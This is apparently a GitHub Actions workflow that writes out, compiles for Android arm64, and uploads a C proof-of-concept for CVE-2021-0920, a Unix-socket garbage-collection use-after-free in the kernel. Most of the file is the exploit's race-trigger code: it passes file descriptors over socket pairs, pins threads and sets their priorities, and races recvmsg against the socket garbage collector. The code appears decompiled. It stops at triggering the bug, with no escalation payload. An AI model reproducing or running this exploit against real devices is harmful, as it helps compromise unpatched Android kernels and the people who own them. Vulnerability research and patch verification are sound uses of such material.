name: build_cve_2021_0920_poc
on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Android NDK
        uses: nttld/setup-ndk@v1
        id: setup-ndk
        with:
          ndk-version: r27c
          add-to-path: true

      - name: Write PoC source
        run: |
          cat << 'EOF' > poc.c
          #define _GNU_SOURCE
          #include <fcntl.h>
          #include <pthread.h>
          #include <sched.h>
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <sys/mman.h>
          #include <sys/resource.h>
          #include <sys/socket.h>
          #include <sys/time.h>
          #include <sys/types.h>
          #include <sys/wait.h>
          #include <time.h>
          #include <unistd.h>

          #define __int64 long
          #define __int8 char

          int sv[2];
          pthread_mutex_t condition_mutex_recvmsg;
          pthread_mutex_t condition_mutex_recv;
          int g_victim_sock_fd;
          pthread_mutex_t condition_mutex_gc;
          pthread_cond_t condition_cond_gc;
          pthread_cond_t condition_cond_recvmsg;

          static void send_fd(int socket, int fd) {
              struct msghdr msg = {0};
              char buf[CMSG_SPACE(sizeof(fd))];
              memset(buf, '\0', sizeof(buf));
              struct iovec io = {.iov_base = "", .iov_len = 1};
              msg.msg_iov = &io;
              msg.msg_iovlen = 1;
              msg.msg_control = buf;
              msg.msg_controllen = sizeof(buf);
              struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
              cmsg->cmsg_level = SOL_SOCKET;
              cmsg->cmsg_type = SCM_RIGHTS;
              cmsg->cmsg_len = CMSG_LEN(sizeof(fd));
              *((int *)CMSG_DATA(cmsg)) = fd;
              msg.msg_controllen = CMSG_SPACE(sizeof(fd));
              if (sendmsg(socket, &msg, 0) < 0)
                  perror("Failed to send message send_fd");
          }

          __int64 pin_cpu(int core_id) {
              cpu_set_t mask;
              CPU_ZERO(&mask);
              CPU_SET(core_id, &mask);
              return sched_setaffinity(0, sizeof(mask), &mask);
          }

          void t_main_gc_simple(__int64 a1, __int64 a2) {
              int v3;
              int fd;
              setpriority(PRIO_PROCESS, 0, -19);
              pin_cpu(3LL);
              pthread_mutex_lock(&condition_mutex_gc);
              pthread_cond_wait(&condition_cond_gc, &condition_mutex_gc);
              pthread_mutex_unlock(&condition_mutex_gc);
              fd = socket(1, 1, 0);
              v3 = socket(1, 1, 0);
              setpriority(PRIO_PROCESS, 0, -18);
              close(fd);
              pthread_cond_signal(&condition_cond_recvmsg);
              close(v3);
              usleep(0x186A0u);
          }

          int fd_34[2];
          int local_spair[2];

          __int64 setup_race(int a1) {
              int v5[710];
              setpriority(PRIO_PROCESS, 0, 19);
              int fd = socket(1, 1, 0);
              close(fd);
              usleep(0x61A80u);
              socketpair(1, 1, 0, fd_34);
              send_fd(sv[0], fd_34[1]);
              send_fd(fd_34[0], fd_34[0]);
              for (int i = 0; i <= 99; ++i) {
                  socketpair(1, 1, 0, &v5[2 * i + 510]);
                  for (int k = 0; k <= 4; ++k)
                      v5[5 * i + 10 + k] = socket(1, 1, 0);
              }
              for (int i = 0; i <= 99; ++i) {
                  send_fd(fd_34[1], v5[2 * i + 511]);
                  for (int k = 0; k <= 4; ++k) {
                      send_fd(v5[2 * i + 510], v5[5 * i + 10 + k]);
                      close(v5[5 * i + 10 + k]);
                  }
                  close(v5[2 * i + 511]);
                  close(v5[2 * i + 510]);
              }
              close(fd_34[1]);
              close(fd_34[0]);
              usleep(0x186A0u);
              pthread_cond_signal(&condition_cond_gc);
              usleep(0x186A0u);
              close(sv[0]);
              return 0;
          }

          __int64 t_recvmsg() {
              char v9 = 0;
              long v10[130];
              struct msghdr v11;
              long received_fds[10];
              int v14, v16, v17;
              setpriority(PRIO_PROCESS, 0, 20);
              memset(&v11, 0, sizeof(v11));
              v10[0] = (long)&v9;
              v10[1] = 1LL;
              v11.msg_iov = (struct iovec *)&v10;
              v11.msg_iovlen = 1LL;
              v11.msg_control = received_fds;
              v11.msg_controllen = 20LL;
              int *received_fds_ptr = (int *)received_fds;
              received_fds[0] = 20LL;
              pin_cpu(2LL);
              setpriority(PRIO_PROCESS, 0, -19);
              pthread_mutex_lock(&condition_mutex_recvmsg);
              pthread_cond_wait(&condition_cond_recvmsg, &condition_mutex_recvmsg);
              pthread_mutex_unlock(&condition_mutex_recvmsg);
              usleep(0xFAu);
              recvmsg(sv[1], &v11, 0x80042);
              int fd = received_fds_ptr[4];
              recvmsg(fd, &v11, 0x80042);
              g_victim_sock_fd = received_fds_ptr[4];
              usleep(0x3E8u);
              v16 = -1;
              recvmsg(fd, &v11, 0x80040);
              v16 = received_fds_ptr[4];
              usleep(0x186A0u);
              close(fd);
              close(v16);
              close(sv[1]);
              pthread_exit(0LL);
              return 0LL;
          }

          void trigger() {
              pthread_t v18, v20, v21;
              pthread_create(&v20, 0LL, (void *(*)(void *))t_main_gc_simple, 0LL);
              pthread_create(&v18, 0LL, (void *(*)(void *))t_recvmsg, 0LL);
              usleep(0x2710u);
              pthread_create(&v21, 0LL, (void *(*)(void *))setup_race, 0LL);
              pthread_join(v21, 0LL);
              pthread_join(v18, 0LL);
              pthread_join(v20, 0LL);
              usleep(10);
              puts("wut?");
          }

          int main(int argc, char **argv) {
              for (int i = 0; i < 20; i++) {
                  if (socketpair(1, 1, 0, sv) != 0)
                      printf("Failed to create Unix-domain socket pair\n");
                  trigger();
              }
              return 0;
          }
          EOF

      - name: Compile PoC
        env:
          ANDROID_NDK_HOME: ${{ steps.setup-ndk.outputs.ndk-path }}
        run: |
          $ANDROID_NDK_HOME/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang \
            -static -O2 -pthread poc.c -o poc
          file poc
          ls -la poc

      - uses: actions/upload-artifact@v4
        with:
          name: cve-2021-0920-poc
          path: poc
